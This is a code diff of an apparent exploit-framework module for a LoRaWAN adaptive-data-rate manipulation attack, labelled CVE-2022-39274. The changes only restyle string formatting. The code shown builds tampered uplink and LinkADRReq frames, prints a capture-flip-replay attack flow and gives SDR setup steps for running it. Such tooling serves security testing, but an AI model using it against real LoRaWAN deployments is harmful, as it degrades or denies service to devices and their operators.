@@ -151,16 +151,16 @@ class Exploit(Exploit):
 
         dev_addr = self._parse_dev_addr()
         if dev_addr is None:
-            print_error("Invalid device address: {}".format(self.dev_addr))
+            print_error(f"Invalid device address: {self.dev_addr}")
             return
 
-        print_info("Target DevAddr: 0x{:08X}".format(dev_addr))
-        print_info("Frequency: {} Hz, Target SF: {}".format(self.frequency, self.target_sf))
+        print_info(f"Target DevAddr: 0x{dev_addr:08X}")
+        print_info(f"Frequency: {self.frequency} Hz, Target SF: {self.target_sf}")
 
         print_status("Constructing sample uplink frame...")
         sample_payload = os.urandom(8)
         uplink = _build_lorawan_uplink(dev_addr, fcnt=42, fport=1, payload=sample_payload)
-        print_info("Original uplink: {} bytes, hex: {}".format(len(uplink), uplink.hex()))
+        print_info(f"Original uplink: {len(uplink)} bytes, hex: {uplink.hex()}")
 
         print_status("Generating ADR manipulation variants...")
         variants = []
@@ -175,9 +175,7 @@ class Exploit(Exploit):
         variants.append(("FCnt LSB flip", modified_fcnt, "Desynchronizes frame counter"))
 
         _, adr_cmd = _build_adr_manipulation_frame(uplink, int(self.target_sf), int(self.target_power))
-        variants.append(("LinkADRReq injection", adr_cmd, "Forces SF{}/TXPow={}".format(
-            self.target_sf, self.target_power,
-        )))
+        variants.append(("LinkADRReq injection", adr_cmd, f"Forces SF{self.target_sf}/TXPow={self.target_power}"))
 
         headers = ("Variant", "Size", "Effect", "Data (hex, first 32)")
         rows = []
@@ -186,14 +184,14 @@ class Exploit(Exploit):
         print_table(headers, *rows)
 
         print_info("Attack flow:")
-        print_info("  1. Capture legitimate uplinks from DevAddr 0x{:08X}".format(dev_addr))
+        print_info(f"  1. Capture legitimate uplinks from DevAddr 0x{dev_addr:08X}")
         print_info("  2. Flip ADR/FCnt bits in captured frames")
         print_info("  3. Replay modified frames to network server")
         print_info("  4. Server issues incorrect LinkADRReq to device")
-        print_info("  5. Device adopts degraded radio parameters (SF{}, low power)".format(self.target_sf))
+        print_info(f"  5. Device adopts degraded radio parameters (SF{self.target_sf}, low power)")
 
         print_warning("CVE-2022-39274: ADR manipulation degrades or denies LoRaWAN link")
         print_info(
-            "To execute: configure SDR '{}' on {} Hz with "
-            "LoRa modulation SF{}".format(self.interface, self.frequency, self.spreading_factor)
+            f"To execute: configure SDR '{self.interface}' on {self.frequency} Hz with "
+            f"LoRa modulation SF{self.spreading_factor}"
         )
